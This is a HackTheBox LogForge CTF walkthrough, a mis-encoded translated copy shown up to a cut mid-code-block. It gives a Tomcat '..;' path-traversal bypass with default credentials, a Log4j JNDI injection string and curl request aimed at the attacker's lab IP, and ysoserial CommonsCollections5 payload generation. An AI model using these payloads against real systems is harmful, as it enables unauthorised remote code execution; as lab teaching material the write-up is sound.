<html>
<head>
<title>LogForge from HackTheBox â€” Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">æ¥è‡ªHackTheBoxçš„LogForgeè¯¦ç»†æ¼”ç»ƒ</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/logforge-from-hackthebox-detailed-walkthrough-9c3a921a9171?source=collection_archive---------1-----------------------#2022-01-02">https://infosecwriteups.com/logforge-from-hackthebox-detailed-walkthrough-9c3a921a9171?source=collection_archive---------1-----------------------#2022-01-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="e4e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å±•ç¤ºå®Œæˆç›’å­æ‰€éœ€çš„æ‰€æœ‰å·¥å…·å’ŒæŠ€æœ¯ã€‚</p><h1 id="c109" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æœºå™¨ä¿¡æ¯</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/b7039ff6c791f2bc70f7f3f682fd151e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1002/format:webp/0*5ZS-8HPG-tEv6NyI.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">HackTheBoxçš„LogForge</figcaption></figure><p id="ac54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">LogForgeæ˜¯HackTheBoxä¸Šçš„ä¸­å‹æœºå™¨ã€‚ç”±<a class="ae lv" href="https://twitter.com/ippsec" rel="noopener ugc nofollow" target="_blank"> Ippsec </a>ä¸º2021å¹´12æœˆ<a class="ae lv" href="https://en.hackingesports.com.br/uhc" rel="noopener ugc nofollow" target="_blank"> UHC </a>æ€»å†³èµ›åˆ›å»ºï¼Œå®ƒä¸“æ³¨äºåˆ©ç”¨Log4jä¸­çš„æ¼æ´ã€‚</p><p id="d101" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬ä»ä¸€ä¸ªç®€å•çš„ç½‘ç«™å¼€å§‹ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨è·¯å¾„éå†å’Œé»˜è®¤å‡­è¯æ¥è®¿é—®Tomcatåº”ç”¨ç¨‹åºç®¡ç†å™¨ã€‚åœ¨é‚£é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨JNDIæŸ¥è¯¢æ¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå¹¶æœ€ç»ˆè·å¾—ä¸€ä¸ªåå‘å¤–å£³ã€‚å‡çº§åˆ°rootç”¨æˆ·æ˜¯é€šè¿‡åç¼–è¯‘æœåŠ¡å™¨ä¸ŠåŸºäºJavaçš„FTPåº”ç”¨ç¨‹åºå®ç°çš„ï¼Œç„¶ååœ¨å…¶ä¸­ä½¿ç”¨JNDIæŸ¥è¯¢æ¥æ­ç¤ºåŒ…å«ç”¨æˆ·åå’Œå¯†ç çš„ç¯å¢ƒå˜é‡ã€‚</p><p id="0abc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€éœ€çš„æŠ€èƒ½æ˜¯ç½‘ç»œå’Œæ“ä½œç³»ç»Ÿæšä¸¾ï¼Œç ”ç©¶å’Œæ“çºµåˆ©ç”¨ã€‚å­¦åˆ°çš„æŠ€èƒ½æ˜¯åˆ©ç”¨JNDIæ¼æ´å’ŒJAVAååºåˆ—åŒ–æ”»å‡»ã€‚</p><div class="lw lx gp gr ly lz"><a href="https://www.hackthebox.com/home/machines/profile/428" rel="noopener  ugc nofollow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">ç ´è§£ç›’å­::æ¸—é€æµ‹è¯•å®éªŒå®¤â€” LogForge</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">ç™»å½•Hack The Boxå¹³å°ï¼Œè®©æ‚¨çš„ç¬”æµ‹è¯•å’Œç½‘ç»œå®‰å…¨æŠ€èƒ½æ›´ä¸Šä¸€å±‚æ¥¼ï¼</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">www.hackthebox.com</p></div></div><div class="mi l"><div class="mj l mk ml mm mi mn lp lz"/></div></div></a></div><h1 id="28cd" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åˆæ­¥ä¾¦å¯Ÿ</h1><p id="4c2c" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œè®©æˆ‘ä»¬ä»Nmapå¼€å§‹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi mt"><img src="../Images/f575ac89fa953290cdf80d6c2e06fca3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IQC0WQDUeN9ob5_CCe09Zw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Nmap TCPç«¯å£æ‰«æ</figcaption></figure><p id="1111" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬çœ‹åˆ°ä¸¤ä¸ªå¼€æ”¾ç«¯å£ï¼ŒSSHåœ¨22ä¸Šï¼ŒHTTPåœ¨80ä¸Šï¼Œä¸¤ä¸ªè¿‡æ»¤ç«¯å£FTPåœ¨21ä¸Šï¼Œå¦ä¸€ä¸ªHTTPæœåŠ¡åœ¨8080ä¸Šã€‚è®©æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹Apache:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi my"><img src="../Images/945f24cd4b144fd430d34275a9d6c26b.png" data-original-src="https://miro.medium.com/v2/resize:fit:768/format:webp/0*URbgzeMAo6fj9sTi.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ç«¯å£80ä¸Šçš„ç½‘ç«™</figcaption></figure><h1 id="d5a4" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Feroxbuster</h1><p id="86be" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">æˆ‘ä»¬åªæ‰¾åˆ°ä¸€å¼ å›¾ç‰‡ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œè¿™é‡Œæ²¡æœ‰ä»€ä¹ˆæœ‰è¶£çš„ä¸œè¥¿ã€‚è®©æˆ‘ä»¬å°è¯•æ¨¡ç³Šéšè—æ–‡ä»¶å¤¹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi mz"><img src="../Images/c5a436a8353058cc2e54fb2a251542f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EZyOe4s7n4JKdgBVvSNIpA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Feroxbusteræ‰«æéšè—æ–‡ä»¶å¤¹</figcaption></figure><p id="466e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å®ƒå‘ç°äº†å‡ ä¸ªæ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬çœ‹åˆ°ç¦æ­¢ä»ç«¯å£80è®¿é—®:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi na"><img src="../Images/4245b7b8f162acc5ab17ce2bffc03da3.png" data-original-src="https://miro.medium.com/v2/resize:fit:816/format:webp/0*cm4BF96jd-rU1080.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ç¦æ­¢è®¿é—®ç»ç†</figcaption></figure><p id="4008" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æœ‰è¶£çš„æ˜¯ï¼Œè¯•å›¾è®¿é—®ä¸å­˜åœ¨çš„ä¸œè¥¿æ˜¾ç¤ºTomcatæ­£åœ¨è¿è¡Œ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/88ebb337d3369e488092a20f2ceaa189.png" data-original-src="https://miro.medium.com/v2/resize:fit:928/format:webp/0*fGcf2xVhg7lBEOhG.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">åœ¨ç«¯å£8080ä¸Šè¿è¡Œçš„Tomcat</figcaption></figure><p id="c9e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥å‡è®¾Tomcatè¿è¡Œåœ¨å®ƒçš„é»˜è®¤ç«¯å£8080ä¸Šï¼ŒApacheæ­£åœ¨é‡å®šå‘åˆ°å®ƒã€‚</p><h1 id="a90a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">è·¯å¾„éå†</h1><p id="7fb4" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">æœ‰äº†è¿™ä¸ªçŸ¥è¯†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åœ¨å¦ä¸€ä¸ªå«åš<a class="ae lv" href="https://pencer.io/ctf/ctf-htb-seal/#path-traversal" rel="noopener ugc nofollow" target="_blank">å¯†å°</a>çš„HTBç›’ä¸Šä½¿ç”¨çš„åŒæ ·çš„æ—è·¯æŠ€æœ¯ã€‚è¿™é‡Œè¯¦ç»†çš„<a class="ae lv" href="https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/" rel="noopener ugc nofollow" target="_blank">æˆ‘ä»¬å¯ä»¥ç®€å•åœ°ä½¿ç”¨</a>..ï¼›åœ¨æˆ‘ä»¬ä¸å­˜åœ¨çš„è·¯å¾„ä¹‹åï¼Œç„¶åæ”¾å…¥æˆ‘ä»¬æƒ³è¦è®¿é—®çš„æ–‡ä»¶å¤¹ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬è¯•å›¾åˆ°è¾¾ç®¡ç†å™¨:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/314faaea5516546bf5ae71b82f6783b7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1220/format:webp/0*Zb4FbNhZujrLVrl-.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Tomcatç®¡ç†å™¨ç™»å½•æ—è·¯</figcaption></figure><p id="6347" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">tomcatç®¡ç†å™¨åº”ç”¨ç¨‹åºçš„ç™»å½•æ¡†å¼¹å‡ºï¼Œä½¿ç”¨tomcatçš„é»˜è®¤å‡­è¯:Tomcatè®©æˆ‘ä»¬è¿›å…¥:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nd"><img src="../Images/1feb9b44cd427b98c1217e17b4ce6479.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*js1g2j9eja-DMeo-.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Tomcat Webåº”ç”¨ç¨‹åºç®¡ç†å™¨</figcaption></figure><p id="9cea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘è¯•ç€ä¸Šä¼ ä¸€ä¸ªmsfvenomç”Ÿæˆçš„waræ–‡ä»¶ï¼Œå°±åƒæˆ‘ä»¬åœ¨Seal box <a class="ae lv" href="https://pencer.io/ctf/ctf-htb-seal/#msfvenom" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œ</a>æ‰€åšçš„ä¸€æ ·ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¢«1kbçš„æ–‡ä»¶å¤§å°é™åˆ¶é˜»æ­¢äº†ã€‚è¿™ä¸ªç›’å­å«åšLogForgeï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å®‰å…¨åœ°å‡è®¾æˆ‘ä»¬çš„è·¯å¾„ç°åœ¨æ­£åœ¨ä½¿ç”¨log4jæ¼æ´è¿›è¡Œã€‚</p><h1 id="7856" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åˆ©ç”¨JNDIæŸ¥è¯¢</h1><p id="c33f" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">å¦‚æœä½ åœ¨æœªæ¥çš„æŸä¸ªæ—¶å€™è¯»åˆ°è¿™ç¯‡æ–‡ç« ï¼Œå¸Œæœ›äº‹æƒ…å·²ç»å¹³æ¯äº†ï¼Œä½†ç°åœ¨log4jå’Œåˆ©ç”¨JNDIçš„æ¼æ´å·²ç»éå¸ƒäº’è”ç½‘ã€‚å¦‚æœä½ éœ€è¦çš„è¯ï¼Œå¯ä»¥åœ¨è¿™é‡Œ<a class="ae lv" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html" rel="noopener ugc nofollow" target="_blank">å’Œ</a><a class="ae lv" href="https://thenewstack.io/log4shell-we-are-in-so-much-trouble/" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œ</a>è¯»ä¸€ç‚¹ã€‚Reddit <a class="ae lv" href="https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/" rel="noopener ugc nofollow" target="_blank">ä¸Šè¿˜æœ‰ä¸€ä¸ªå¾ˆå¥½çš„èµ„æºï¼Œè¿™é‡Œæœ‰ä¸€ä¸ª</a>çš„ä¾‹å­ï¼Œå…¶ä¸­åŒ…æ‹¬è¯•å›¾åˆ©ç”¨è¿™ä¸ªæ¼æ´æ—¶å¯ä»¥å°è¯•çš„JNDIæŸ¥è¯¢ã€‚</p><p id="43b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å°†ç®€å•åœ°å¼€å§‹ï¼Œå¹¶å°è¯•ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢é€šè¿‡ldapè®©æœºå™¨è”ç³»æˆ‘:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="43d9" class="nj km iq nf b gy nk nl l nm nn">${jndi:ldap://10.10.14.12/pencer}</span></pre><p id="beac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨Kaliä¸Šå¯åŠ¨ncç›‘å¬ï¼Œç„¶åå°è¯•å°†ä¸Šé¢çš„å†…å®¹ç²˜è´´åˆ°æˆ‘ä»¬åœ¨Tomcat Manageråº”ç”¨ç¨‹åºä¸Šæ‰¾åˆ°çš„å„ä¸ªå­—æ®µä¸­:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi no"><img src="../Images/38ce314b43f9e5fa294a47ca8c3239ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*PKUMUqXE5whKll-I.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æµ‹è¯•JNDIæ¼æ´</figcaption></figure><p id="6a0f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç²˜è´´å¹¶æŒ‰ä¸‹Expire SessionsæŒ‰é’®åï¼Œåˆ‡æ¢åˆ°Kaliä¸Šçš„nc:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="f439" class="nj km iq nf b gy nk nl l nm nn">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/logforge]<br/>â””â”€# nc -nlvp 389<br/>listening on [any] 389 ...<br/>connect to [10.10.14.12] from (UNKNOWN) [10.10.11.138] 48504<br/>0<br/> `ï¿½</span></pre><p id="5115" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™äº›å­—ç¬¦è¯æ˜æœåŠ¡å™¨è¯•å›¾é€šè¿‡LDAPåœ¨ç«¯å£389ä¸Šè¿æ¥åˆ°æˆ‘ä»¬ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨curlä»£æ›¿æµè§ˆå™¨æ¥åšè¿™ä»¶äº‹ï¼Œå°±åƒæˆ‘ä»¬åœ¨box <a class="ae lv" href="https://pencer.io/ctf/ctf-htb-dynstr/#api-investigation" rel="noopener ugc nofollow" target="_blank"> Dynstr </a>ä¸Šåšçš„é‚£æ ·:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="047a" class="nj km iq nf b gy nk nl l nm nn">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# curl "http://10.10.11.138/pencer/..;/manager/html/expire?path=/" --data-binary "idle=\${jndi:ldap://10.10.14.12/pencer}" <br/>-H "Authorization: Basic dG9tY2F0OnRvbWNhdA=="</span></pre><p id="3656" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ³¨æ„ï¼Œåœ¨ç”¨curlåšè¿™ä»¶äº‹çš„æ—¶å€™ï¼Œæˆ‘å¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œäº†base64ç¼–ç ï¼Œæ‰€ä»¥å®ƒå¯ä»¥åœ¨å¤´ä¸­ä¼ é€’ã€‚</p><p id="7a1e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸ºäº†èƒ½å¤Ÿåˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªLDAPæœåŠ¡å™¨ç­‰å¾…Kaliã€‚æˆ‘ä»¬è¿˜éœ€è¦ä¸€ç§ä¸JNDIäº¤äº’çš„æ–¹å¼ï¼Œä»¥ä¾¿èƒ½å¤Ÿå°†Javaæœ‰æ•ˆè½½è·å‘é€å›æ¥ã€‚</p><h1 id="3860" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">JNDIæ¼æ´å·¥å…·åŒ…</h1><p id="2209" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">å¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬æœ‰<a class="ae lv" href="https://github.com/pimps/JNDI-Exploit-Kit" rel="noopener ugc nofollow" target="_blank">è¿™å¥—</a>ç¥å¥‡çš„è£…å¤‡ã€‚è®©æˆ‘ä»¬æŠ“ä½å®ƒçœ‹ä¸€çœ‹:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="ef0d" class="nj km iq nf b gy nk nl l nm nn">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/logforge]<br/>â””â”€# git clone https://github.com/pimps/JNDI-Exploit-Kit.git<br/>Cloning into 'JNDI-Exploit-Kit'...<br/>remote: Enumerating objects: 328, done.<br/>remote: Counting objects: 100% (328/328), done.<br/>remote: Compressing objects: 100% (232/232), done.<br/>remote: Total 328 (delta 123), reused 230 (delta 61), pack-reused 0<br/>Receiving objects: 100% (328/328), 27.74 MiB | 10.42 MiB/s, done.<br/>Resolving deltas: 100% (123/123), done.<br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/logforge]<br/>â””â”€# cd JNDI-Exploit-Kit</span></pre><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi np"><img src="../Images/b9fcb2beaf021a0d5dafd9d48de79263.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jEwExyTHHWSkPGFLmi6r_Q.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">JNDIæ¼æ´å·¥å…·åŒ…</figcaption></figure><h1 id="a08a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">YSOSerial</h1><p id="96a2" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">åŸå§‹æ¼æ´åˆ©ç”¨å·¥å…·åŒ…çš„è¿™ä¸ªåˆ†æ”¯æ”¯æŒä¸€ä¸ªYSOSerialäºŒè¿›åˆ¶æœ‰æ•ˆè½½è·ã€‚è®©æˆ‘ä»¬æŠ“ä½YSOSerialçš„<a class="ae lv" href="https://github.com/pimps/ysoserial-modified" rel="noopener ugc nofollow" target="_blank">ä¿®æ”¹ç‰ˆæœ¬</a>ï¼Œå› ä¸ºå®ƒæ”¯æŒå¤šä¸ªå‘½ä»¤ï¼Œè¿™å°†ä½¿æˆ‘ä»¬çš„åå‘shellæœ‰æ•ˆè´Ÿè½½æ›´å®¹æ˜“:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="c2cd" class="nj km iq nf b gy nk nl l nm nn">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/logforge]<br/>â””â”€# git clone https://github.com/pimps/ysoserial-modified.git<br/>Cloning into 'ysoserial-modified'...<br/>remote: Enumerating objects: 324, done.<br/>remote: Total 324 (delta 0), reused 0 (delta 0), pack-reused 324<br/>Receiving objects: 100% (324/324), 84.22 MiB | 15.72 MiB/s, done.<br/>Resolving deltas: 100% (94/94), done.<br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/logforge]<br/>â””â”€# cd ysoserial-modified/target</span><span id="e244" class="nj km iq nf b gy nq nl l nm nn">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/logforge/ysoserial-modified/target]<br/>â””â”€# java -jar ysoserial-modified.jar -h<br/>Y SO SERIAL?<br/>Usage: java -jar ysoserial-[version]-all.jar [payload type] [terminal type: cmd / bash / powershell / none] '[command to execute]'<br/>   ex: java -jar ysoserial-[version]-all.jar CommonsCollections5 bash 'touch /tmp/ysoserial'<br/>        Available payload types:<br/>                BeanShell1 [org.beanshell:bsh:2.0b5]<br/>                C3P0 [com.mchange:c3p0:0.9.5.2, com.mchange:mchange-commons-java:0.2.11]<br/>                CommonsBeanutils1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]<br/>                CommonsCollections1 [commons-collections:commons-collections:3.1]<br/>                CommonsCollections2 [org.apache.commons:commons-collections4:4.0]<br/>                CommonsCollections3 [commons-collections:commons-collections:3.1]<br/>                CommonsCollections4 [org.apache.commons:commons-collections4:4.0]<br/>                CommonsCollections5 [commons-collections:commons-collections:3.1]<br/>&lt;SNIP&gt;</span></pre><p id="d6eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">YSOSerialéå¸¸å…¨é¢ï¼ŒHackTricksåœ¨è¿™é‡Œæœ‰ä¸€äº›å…³äºååºåˆ—åŒ–æ¦‚å¿µå’Œä½¿ç”¨YSOSerialæ¥åˆ©ç”¨è¿™ç§æ”»å‡»æ–¹æ³•çš„æœ‰ç”¨ä¿¡æ¯ã€‚æ ¹æ®å·¥å…·æè¿°:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="0bd1" class="nj km iq nf b gy nk nl l nm nn">ysoserial is a collection of utilities and property-oriented programming "gadget chains" discovered in common java libraries that can, under the right conditions, exploit Java applications performing unsafe de-serialization of objects.</span></pre><p id="dbbb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™é‡Œçš„å…³é”®ç‚¹æ˜¯ï¼Œå®ƒåˆ©ç”¨ç›®æ ‡åº”ç”¨ç¨‹åºä¸Šå¯èƒ½å·²ç»å­˜åœ¨çš„å…¬å…±ä»£ç ï¼Œå…è®¸æˆ‘ä»¬æ‰§è¡Œè‡ªå·±çš„ä»£ç ã€‚</p><h1 id="df08" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Javaååºåˆ—åŒ–æ”»å‡»</h1><p id="2ac3" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®€å•çš„æœ‰æ•ˆè´Ÿè½½ï¼Œå®ƒå°†ä»æœºå™¨ä¸Špingæˆ‘:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="e725" class="nj km iq nf b gy nk nl l nm nn">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/logforge]<br/>â””â”€# java -jar ysoserial-modified/target/ysoserial-modified.jar CommonsCollections5 bash 'ping -c 4 10.10.14.12' &gt; pencer.ser</span><span id="f993" class="nj km iq nf b gy nq nl l nm nn">WARNING: An illegal reflective access operation has occurred<br/>WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/root/htb/logforge/ysoserial-modified/target/ysoserial-modified.jar) to field javax.management.BadAttributeValueExpException.val<br/>WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5<br/>WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations<br/>WARNING: All illegal access operations will be denied in a future release</span></pre><p id="8f3b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¿½ç•¥è­¦å‘Šï¼Œå› ä¸ºè¿™å¾ˆæ­£å¸¸ã€‚ä¸Šé¢åˆ›å»ºäº†ä¸€ä¸ªåä¸ºpencer.serçš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¸€æ—¦åœ¨ç›®æ ‡ä¸Šååºåˆ—åŒ–ï¼Œå°±ä¼šå°è¯•pingæˆ‘çš„Kali IPå››æ¬¡ã€‚å¯¹äºè¿™ä¸ªç›’å­ï¼Œæˆ‘ä½¿ç”¨äº†CommonsCollections5ï¼Œä½ å¯èƒ½éœ€è¦å°è¯•å‡ ä¸ªä¸åŒçš„ï¼Œç›´åˆ°ä½ å¾—åˆ°ä¸€ä¸ªå¯ä»¥åœ¨å¦ä¸€ä¸ªç›’å­ä¸Šå·¥ä½œçš„ã€‚æ¥ä¸‹æ¥å¯åŠ¨JNDIæ¼æ´åˆ©ç”¨å·¥å…·åŒ…ï¼Œå‘Šè¯‰å®ƒæœ‰æ•ˆè´Ÿè½½æ˜¯æˆ‘çš„pencer.seræ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨æˆ‘çš„Kali tun0 IPåœ¨ç«¯å£389ä¸Šå¯åŠ¨LDAPæœåŠ¡å™¨:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nr"><img src="../Images/94252d52d23a5a2852fbd85b4b92b4c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_8NNCrO2M7yQerXHBXA0cQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">JNDIæ¼æ´åˆ©ç”¨å·¥å…·åŒ…æœåŠ¡å™¨pencer.seræœ‰æ•ˆè´Ÿè½½</figcaption></figure><p id="1fe1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æ‚¨æ‰€è§ï¼Œæ ¹æ®æˆ‘ä»¬æ­£åœ¨å¤„ç†çš„JDKç‰ˆæœ¬ï¼Œä¸åŒçš„ç¯å¢ƒæœ‰ä¸åŒçš„ç›®æ ‡ã€‚ä½ å¯èƒ½éœ€è¦åå¤è¯•éªŒæ‰èƒ½æ‰¾åˆ°é€‚åˆä½ çš„å¦ä¸€ä¸ªç›’å­ã€‚</p><p id="8338" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨é‚£ä¸ªåˆ—è¡¨ä¸­ï¼Œè¿™æ˜¯æˆ‘ä½¿ç”¨çš„ä¸€ä¸ª:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="c887" class="nj km iq nf b gy nk nl l nm nn">Target environment(Build in JDK 1.5 whose trustURLCodebase is 